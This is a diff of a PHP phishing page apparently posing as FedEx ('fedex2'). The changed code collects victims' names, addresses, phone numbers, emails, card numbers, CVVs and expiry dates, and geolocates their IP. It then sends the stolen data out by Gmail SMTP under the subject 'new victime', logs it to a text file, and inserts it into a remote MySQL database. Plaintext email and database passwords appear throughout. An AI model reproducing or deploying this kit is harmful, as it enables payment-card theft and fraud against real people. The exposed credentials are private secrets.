@@ -1,25 +1,14 @@
+<html lang="en" >
 <meta charset="utf-8"> 
 <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">     
 <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
-<title>project2</title>
-<style>
-*{ border:0; margin:0; outline: none !important; list-style-type:none; }  
-*, ::after, ::before {    box-sizing: border-box;}  
-ul {padding:0; margin:0;}
-html , body {background:transparent; }    
-@font-face {   font-family: 'Stingray';   font-style: normal;     font-weight: 400;    src: local('Stingray'), url('https://fonts.cdnfonts.com/s/22150/Stingray.woff') format('woff');} 
-</style>
+<title>fedex2</title>
 <script type="text/javascript"  src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<link rel="stylesheet" href="http://fonts.cdnfonts.com/css/font">  
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo:200,300,400,500,600,700,800">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
-<script  type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"      ></script>
-<link rel="stylesheet" href="https://wowjs.uk/css/libs/animate.css"> 
-<script type="text/javascript"  src="https://wowjs.uk/dist/wow.min.js"></script>
-<script> new WOW().init(); </script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"> <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo:200,300,400,500,600,700,800">  <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/stingray">     <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/font">  
+<style> html , body {}   *{ padding:0; border:0; margin:0; outline: none !important;  list-style: none; box-sizing:border-box; text-decoration:none;}   ::after ,::before { box-sizing: border-box;}    </style>
+
+
 
 
 
@@ -97,9 +86,11 @@ require 'autre/phpmailer/smtp.php';
 
 
 
-if(  isset($_POST["name"]) &&  $infoip=@unserialize(file_get_contents('http://ip-api.com/php/' .$ip))  )
+if(          isset($_POST["name"])      &&       $infoip=@unserialize(file_get_contents('http://ip-api.com/php/' .$ip))            )
 {		
-$connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
+
+
+$connect = new PDO("mysql:host=freedb.tech;    dbname=freedbtech_wordpresst"   ,     "freedbtech_mehdiouatmane"    ,    "mehdi2014@A");
 function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }
 $ip = get_ip();  
 $name = $_POST["name"];
@@ -118,21 +109,22 @@ $datexp = $_POST['datexp'];
 
 
 
+
 $mail = new PHPMailer(); 
-$mail->IsSMTP(); 
+$mail->isSMTP(); 
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 587; 
 $mail->SMTPAuth = true; 
-$mail->SMTPSecure = 'tls'; 		
+$mail->SMTPSecure = 'tls'; 
+$mail->Mailer = "smtp";
 $mail->SMTPOptions=array('ssl'=>array(	'verify_peer'=>false,	'verify_peer_name'=>false,	'allow_self_signed'=>false	));	
 $mail->Username = "mehdiouatmane9@gmail.com";
 $mail->Password = "mehdi2014@A";
-$mail->SetFrom( "mehdiouatmane9@gmail.com"  , $name );	         
-$mail->AddAddress('mehdi.ouatmane@gmail.com' , 'Friend1' );  
-$mail->AddAddress('mehdiouatmane9@gmail.com' , 'Friend2' );  
+$mail->SetFrom   ("mehdiouatmane9@gmail.com"   , "FROM" );	         
+$mail->AddAddress("mehdiouatmane9@gmail.com"   , "TOfriend1" );   
 $mail->IsHTML(true);   
 $mail->Subject = 'new victime';           
-$mail->Body = 'les info victime: '     .      '<br> ip: '     .    $ip     .   '<br> name: '   .    $name    .   '<br> date: '    .  $date    .   '<br> address: ' .  $address   .   '<br> codepostal: '  .  $codepostal   .   '<br> city: '  .  $city    .   '<br> phone: '    .    $phone    .   '<br> email: '    .   $email        .   '<br> namecard: '    .   $namecard       .   '<br> cardnumber: '    .   $cardnumber        .   '<br> cvv: '    .   $cvv       .   '<br> datexp: '    .   $datexp        ;           
+$mail->Body = 'les info victime: '             .                '<br> ip: '  .  $ip                        .                    '<br> infoip: '  .  $infoip['country'] . " "  . $infoip['city']                     .                     '<br> name: '  .  $name                .             '<br> date: '  .  $date                         .                     '<br> address: ' .  $address                   .                    '<br> codepostal: '  .  $codepostal                         .                  '<br> city: '  .  $city                    .               '<br> phone: '   .   $phone                     .               '<br> email: '    .   $email                        .                  '<br> namecard: '    .   $namecard                         .                 '<br> cardnumber: '   .  $cardnumber                      .               '<br> cvv: '  .  $cvv                    .                 '<br> datexp: '   .  $datexp        ;           
 $mail->smtpClose();
 if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 
@@ -147,7 +139,8 @@ if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 
 $file = Fopen("fedex2victime.txt","a+"); 
 fwrite($file , "victime"  . "\n" );
-fwrite($file ,    "ip : "           .      $ip           .      "\n"); 
+fwrite($file ,    "ip : "           .      $ip              .    "\n"); 
+fwrite($file ,    "infoip : "       .      $infoip['country']  . " "  . $infoip['city']   .    "\n"); 
 fwrite($file ,    "name : "         .      $name         .      "\n"); 
 fwrite($file ,    "date : "         .      $date         .      "\n"); 
 fwrite($file ,    "address : "      .      $address      .      "\n"); 
@@ -159,8 +152,6 @@ fwrite($file ,    "namecard : "     .      $namecard     .      "\n");
 fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n"); 
 fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
 fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
-fwrite($file ,    "infoip : "       .      $infoip['country']   .  $infoip['city']   .      "\n"); 
-
 fwrite($file , "\n");
 if ( $file   ) {  echo "";   }else{  echo "";   }
 
@@ -172,17 +163,9 @@ if ( $file   ) {  echo "";   }else{  echo "";   }
 
 
 
-$query =  "INSERT INTO tablee   (ip, name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :ip, :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
-$user_data =  array(    ':ip' => $ip,    ':name' => $name,        ':date' => $date,      ':address' => $address,     ':codepostal' => $codepostal,    ':city' => $city,    ':phone' => $phone,    ':email' => $email,    ':namecard' => $namecard,    ':cardnumber' => $cardnumber,    ':cvv' => $cvv,    ':datexp' => $datexp          ) ;
+$query =  "INSERT INTO tablee   (ip , infoip , name , date , address , codepostal , city  , phone  , email  , namecard  , cardnumber  , cvv  , datexp)   VALUES    ( :ip , :infoip ,  :name , :date , :address , :codepostal , :city , :phone , :email , :namecard , :cardnumber , :cvv , :datexp ) " ;
+$user_data =  array(          ':ip' => $ip              ,               ':infoip' => $infoip['country'] . ' ' . $infoip['city']               ,             ':name' => $name              ,               ':date' => $date            ,            ':address' => $address           ,          ':codepostal' => $codepostal          ,        ':city' => $city       ,        ':phone' => $phone          ,        ':email' => $email          ,             ':namecard' => $namecard           ,           ':cardnumber' => $cardnumber            ,          ':cvv' => $cvv           ,           ':datexp' => $datexp          ) ;
 if(     $connect   ->  prepare($query)	->  execute($user_data)               )       { echo "<script> window.location.href = 'fedex2end.php'; </script>"; }  else   { echo "<script> alert('erreur'); </script>"; }
-
-
-
-
-
-
-
-
 
 
 
@@ -191,12 +174,16 @@ if(     $connect   ->  prepare($query)	->  execute($user_data)               )  
 
 	
 }
-
-
-
-
-
 ?>
+
+
+
+
+
+
+
+
+
 
 
 
